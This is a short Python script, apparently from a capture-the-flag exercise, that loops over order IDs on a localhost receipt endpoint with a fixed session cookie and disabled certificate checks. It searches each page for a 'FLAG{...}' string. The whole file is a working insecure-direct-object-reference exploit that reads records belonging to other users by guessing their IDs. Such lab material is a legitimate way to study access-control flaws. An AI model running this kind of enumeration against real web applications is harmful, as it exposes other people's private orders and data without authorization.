import urllib.request, ssl, re, time
from urllib.error import HTTPError, URLError

base = 'http://localhost:80/order/{}/receipt'
headers = {
    'Cookie': 'session=eyJ1c2VyX2lkIjoxMDAzMn0.aYTSig.SM_msxKbUz4N4-1jGuHIX2Vh3J8',
    'User-Agent': 'Mozilla/5.0'
}

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

pattern = re.compile(r'FLAG\{[^}]+\}', re.I)

start, end = 300000, 301000
hits = []

def fetch(i):
    req = urllib.request.Request(base.format(i), headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=3) as resp:
            if resp.status == 200:
                body = resp.read().decode('utf-8', 'ignore')
                m = pattern.search(body)
                if m:
                    return i, m.group(0)
    except (HTTPError, URLError, Exception):
        return None
    return None

begin = time.time()
for i in range(start, end+1):
    r = fetch(i)
    if r:
        hits.append(r)
        print(f"FOUND {r[0]} {r[1]}")
        break

print('DONE', 'hits=', hits, 'elapsed=', round(time.time()-begin,2))
